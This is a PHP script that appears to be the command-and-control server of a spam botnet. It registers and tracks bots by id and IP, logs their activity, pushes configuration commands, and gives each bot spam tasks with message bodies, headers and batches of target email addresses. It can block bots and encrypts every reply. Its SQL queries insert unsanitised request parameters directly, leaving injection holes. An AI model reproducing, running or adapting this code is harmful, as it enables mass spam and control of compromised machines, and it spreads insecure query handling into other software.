<?php
  require("support.php");
  
  $id=$_GET['id'];
  $tick=$_GET['tick'];
  if (isset($_GET['task']))
    $task = $_GET['task'];
  else
    $task = 0;
  $smtp=$_GET['smtp'];
  $ver=$_GET['ver'];
  $errors = $_GET['errors'];

  if ($ver == '') $ver = 0;
 
  $ip=$_SERVER['REMOTE_ADDR'];
  $time=date("U");
  $host=$ip; //gethostbyaddr($ip);

  $bodys_dir   = "./bodys/";
  $headers_dir = "./headers/";
  $lists_dir   = "./lists/";
  $tasks_dir   = "./tasks/";
  $errors_dir  = "./errors/";
      
  require("cfg.php");
  require("macro.php");
  $status_in_success = 0;
  $status_in_process = 1;

  $block_fg = 0;
      
  $res = @mysql_query("SELECT * FROM robo WHERE `id` = '$id';");
  $Row = @mysql_fetch_array($res);
  if (!$Row)
  {                              
    @mysql_query("INSERT INTO robo (id,ip,tick,time,smtp,ver, bl) VALUES ('$id','$ip','$tick','$time','$smtp','$ver', '0');");        
  } else {    
    $block_fg = $Row["bl"];
    @mysql_query("UPDATE robo SET `time`='$time', `ip`='$ip', `tick`='$tick', `smtp`='$smtp', `ver`='$ver' WHERE `id`='$id';");
  }

  $ip = $_SERVER['REMOTE_ADDR'];
  if ($log_activity)
    @mysql_query("INSERT INTO BotActivity (DateTime,BotId,BotVer,ActivityType,AdditionalId,IP) VALUES ('".date("Y-m-d H:i:s")."','$id','$ver','1','','$ip');");


  $out = "<config>\r\n";

  $BotConfig = @mysql_query("SELECT * FROM BotConfig WHERE Ver='$ver' AND (BotId='$id' OR BotId='');");
  if (mysql_num_rows($BotConfig) < 1)
  {
    //$out .= "";
  } else {
    for ($i=0; $i < mysql_num_rows($BotConfig); $i++) {
      $command = mysql_result($BotConfig,$i,'Command');
      $out .= "$command\r\n";
    }
  }

  $out .= "</config>\r\n";
  $out .= "<info>\r\ntaskid=";

  if ($task != 0)
  {
    $good_count = 0;
    foreach ($errors as $err => $err_count)
    {          
       index_inc("$errors_dir$task.$err", $err_count);
       if ($err == 0)
         $good_count = $err_count;
    }
  
    $fs = @fopen("block.dat", "rb");
    if ($fs)
    {      
      $bl_fg = fread($fs, 1);
      fclose($fs);
    }
    else $bl_fg = 0;
  
    if ($bl_fg == '1')
    {
    
       if ($good_count == 0)
       {     
          $out .= "BLOCk\r\n";
          @mysql_query("UPDATE robo SET `bl` = '1' WHERE `id` = '$id';");     
       }
    }

  }

  if (($smtp === "bad") || ($block_fg == 1)) {
    $out .= "0\r\n";
  } else {
    $task_available = true;
    $tasks = @mysql_query("SELECT * FROM tasks WHERE (`status` = $status_in_process) and (`ver` = $ver) ORDER BY id LIMIT 1;");
    if (mysql_num_rows($tasks) < 1) {
      $tasks = @mysql_query("SELECT * FROM tasks WHERE (`status` = $status_in_process) and (`ver` = \"\") ORDER BY id LIMIT 1;");
      if (mysql_num_rows($tasks) < 1) {
        $task_available = false;
      }
    }
    if ($task_available) {
      $tid = mysql_result($tasks,0,'id');
      $style = mysql_result($tasks,0,'Style');
      $out .= "$tid\r\n";

      $body = stripslashes(join('',file($bodys_dir.mysql_result($tasks,0,'body_id'))));
      if ($style==0)
        $header = stripslashes(join('',file(rnd_header(mysql_result($tasks,0,'header')))));
     
      $lpr1 = mysql_result($tasks,0,'lpr1');
      $lpr2 = mysql_result($tasks,0,'lpr2');
     
      $lpr = rand($lpr1, $lpr2);
     
     
      $list = get_list(mysql_result($tasks,0,'list'),$tid,$lpr,$resint);
      if ($resint == $status_in_success) {
        @mysql_query("UPDATE tasks SET `status`='$status_in_success' WHERE `id`='$tid';");
      }
   
      if ($style==0) {
        $text = str_replace("%MESSAGE_BODY",$body,$header);
        $text .= "\r\n";
      } else {
        $text = $body;
      }
      MacroBody($text);

      $out .= "realip=$ip\r\n";
      $out .= "hostname=$host\r\n"; 
      $out .= "style=$style\r\n";
      $out .= "</info>\r\n";
      $out .= "<emails>\r\n";
      $out .= "$list";
      $out .= "</emails>\r\n";
      if ($task != $tid) {
        $out .= "<text>\r\n";
        $out .= "$text\r\n";
        $out .= "</text>\r\n";
      }
    } else {
      $out .= "0\r\n";
    }
  }
  $out .= "</info>";
  mysql_close($dbase);
  echo CryptData($out,$id);
//  echo $out;
?>